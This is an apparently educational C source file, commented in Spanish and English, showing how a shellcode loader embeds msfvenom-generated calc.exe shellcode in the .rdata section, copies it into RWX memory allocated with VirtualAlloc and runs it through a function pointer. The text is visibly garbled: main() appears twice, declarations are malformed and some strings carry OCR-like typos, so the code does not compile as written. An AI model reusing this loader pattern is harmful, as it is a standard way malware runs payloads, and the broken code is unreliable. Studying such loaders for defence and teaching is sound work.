#include <windows.h>
#include <stdio.h>
/*  
    Ejemplo para aprender:
    muestro cómo meter un payload simple (como un shellcode para abrir la calculadora) dentro de la sección .rdata de un ejecutable.
    AVISO:
    Esto es solo para practicar y en un ambiente controlado y offline. No lo uses para hacer cagadas ni en ambientes productivos.
    
    // Este shellcode abre la calculadora de Windows (generado con msfvenom)
    // msfvenom -p windows/x64/exec CMD=calc.exe -f c
    // Si no lo declarás como escribible, queda guardado en la sección .rdata que es de solo lectura.
*/
const unsigned char Rdata_RawData[] = {
0xFC, 0x48, 0x83, 0xE4, 0xF0, /*... truncated for brevity... */ 0x00
};

int main() {
// Imprimimos la dirección en memoria donde está guardado el payload
printf("[i] Address of embedded payload (.rdata): 0x%p\n", Rdata_RawData)

// Pedimos memoria que se pueda leer, escribir y ejecutar para copiar el shellcode ahí
    void exec_mem VirtualAlloc(
    NULL,
    sizeof(Rdata_RawData),
    MEM_COMMIT MEM_RESERVE | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

if (exec_mem = NULL) {

printf("[-] Memory allocation failed!\n");
return -1;
}   
printf("[+] Memory allocated at: 0x%p\n", exec_mem);
// Copia el shellcode desde la sección de solo lectura a la memoria ejecutable

memcpy(exec_mem, Rdata_RawData, sizeof(Rdata_RawData));
printf("[+1 Pavload copied to executable memorv.\n"):
// Example shellcode to launch calculator (generated via msfvenom)
//msfvenom -p windows/x64/exec CMD=calc.exe -f c
// This will be stored in the rdata section if not declared as writable
const unsigned char Rdata_RawData[] = {
0xFC, 0x48, 0x83, 0xE4, 0xF0, truncated for brevity
    };
}
return 0;

int main() {
// Print the memory address where the shellcode resides
printf("[i] Address of embedded payload (.rdata): 0x%p\n", Rdata_RawData);
// Allocate RWX memory to copy and execute the shellcode safely
void exec_mem VirtualAlloc(
NULL,
sizeof(Rdata_RawData),
MEM_COMMIT MEM_RESERVE,
PAGE_EXECUTE_READWRITE
);
if (exec_mem == NULL) {
printf("[-] Memory allocation failed!\n");
return -1;
printf("[+] Memory allocated at: 0x%p\n", exec_mem);
}
// Copy the shellcode from read-only .rdata to executable memory
memcpy(exec_mem, Rdata_RawData, sizeof(Rdata_RawData));
printf("[+] Payload copied to executable memory.\n");
// Wait for user confirmation before executing
printf("[#] Press <Enter> to execute the payload (e.g., launch calc.exe)...\n");
getchar();
// Create function pointer and jump to shellcode
((void()())exec_mem)();
return 0;
}
